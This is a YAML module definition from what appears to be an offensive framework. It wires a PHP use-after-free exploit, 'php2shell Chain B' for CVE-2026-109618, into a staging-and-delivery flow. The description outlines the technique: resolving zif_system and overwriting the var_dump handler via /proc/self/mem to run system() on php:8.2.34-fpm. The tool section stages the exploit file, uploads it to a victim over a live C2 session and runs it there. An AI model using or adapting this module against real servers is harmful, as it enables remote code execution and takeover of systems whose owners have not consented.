name: php2shell_b
description: |
  php2shell Chain B (CVE-2026-109618): var_destroy UAF to RCE. Resolves
  zif_system through EG(symbol_table) and overwrites the var_dump handler
  pointer via /proc/self/mem: calling var_dump runs system(). Calibrated
  for php:8.2.34-fpm offsets only.

  Target-local: needs PHP CLI on the victim and a writable /proc/self/mem.
  Flow: stages sessions/php2shell_chain_b.php, upload_c2 delivers it,
  issue_command_to_c2 runs it on the victim (stderr output). Needs a live
  C2 session before the remote half.
author: Qi Deng (ikow)
version: '1.0'
enabled: true
update: true
os: linux
trigger: []
category: '03. Exploitation'
module_type: exploit
params:
- name: url
  type: string
  required: false
  default: http://127.0.0.1
  description: Unused by chain B (target-local); kept for family parity.
tool:
  name: php2shell Chain B (UAF handler overwrite)
  repo_url: https://github.com/ikow/php2shell-poc.git
  install_path: external/.exploit/php2shell_poc
  execute_command: cp exploit/chain_b_uaf_rce.php ../../../sessions/php2shell_chain_b.php
    && echo 'staged at sessions/php2shell_chain_b.php - deliver with upload_c2,
    then run php php2shell_chain_b.php on the target'
  upload_file: sessions/php2shell_chain_b.php
  remote_command: no_priv php php2shell_chain_b.php
